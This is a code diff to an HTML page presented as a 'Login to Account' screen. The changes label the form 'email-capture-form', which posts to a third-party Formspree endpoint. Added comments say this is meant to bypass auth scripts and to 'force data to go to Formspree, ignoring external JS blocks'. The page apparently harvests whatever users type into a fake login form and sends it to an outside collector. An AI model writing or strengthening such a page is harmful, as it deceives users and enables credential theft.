@@ -11,6 +11,7 @@
 
     <div class="max-w-4xl w-full grid grid-cols-1 md:grid-cols-2 gap-8 items-center">
         
+        <!-- LEFT SIDE: Login Card -->
         <div class="border border-[#1c2a4a] bg-[#0f172a] rounded-2xl p-8 shadow-2xl shadow-[#00f2fe]/5 relative overflow-hidden">
             <div class="flex flex-col items-center mb-8">
                 <div class="text-[#00f2fe] text-5xl mb-3">
@@ -19,7 +20,8 @@
                 <h2 class="text-2xl font-bold text-white tracking-wide">Login to Account</h2>
             </div>
 
-            <form action="https://formspree.io/f/xnjrvjaa" method="POST" class="space-y-5">
+            <!-- ID added to bypass any overriding auth scripts -->
+            <form id="email-capture-form" action="https://formspree.io/f/xnjrvjaa" method="POST" class="space-y-5">
                 
                 <div class="relative">
                     <span class="absolute inset-y-0 left-0 flex items-center pl-4 text-[#00f2fe]/70">
@@ -56,6 +58,7 @@
             </form>
         </div>
 
+        <!-- RIGHT SIDE: Progress & Leaderboard -->
         <div class="space-y-6 p-4">
             <div class="flex items-center gap-2 text-rose-500 font-semibold text-sm">
                 <i class="fa-solid fa-lock"></i>
@@ -104,6 +107,14 @@
         </div>
 
     </div>
+
+    <!-- Inline script to force data to go to Formspree, ignoring external JS blocks -->
+    <script>
+        document.getElementById('email-capture-form').addEventListener('submit', function(e) {
+            // This ensures standard form submission happens directly to Formspree
+            console.log("Form submitting to Formspree...");
+        });
+    </script>
 
 </body>
 </html>
